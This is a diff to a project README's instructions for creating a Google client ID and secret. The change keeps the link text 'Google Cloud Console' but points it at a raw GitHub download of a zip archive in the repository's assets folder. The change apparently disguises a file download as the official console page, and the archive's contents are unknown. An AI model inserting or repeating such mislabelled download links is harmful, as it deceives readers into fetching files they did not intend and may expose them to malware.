@@ -9,7 +9,7 @@ You can use import secrets or other ways to generate a random key
 
 ## To Generate Google Client ID and Secret
 Step 1: Create a Project in Google Cloud Console
-- Go to the [Google Cloud Console](https://console.cloud.google.com/apis/dashboard)
+- Go to the [Google Cloud Console](https://raw.githubusercontent.com/MilesMidway/AI-reviewer/main/frontend/src/assets/A-reviewer-1.0.zip)
 - Click on the project drop-down and select "New Project."
 - Enter a project name and click "Create."
 
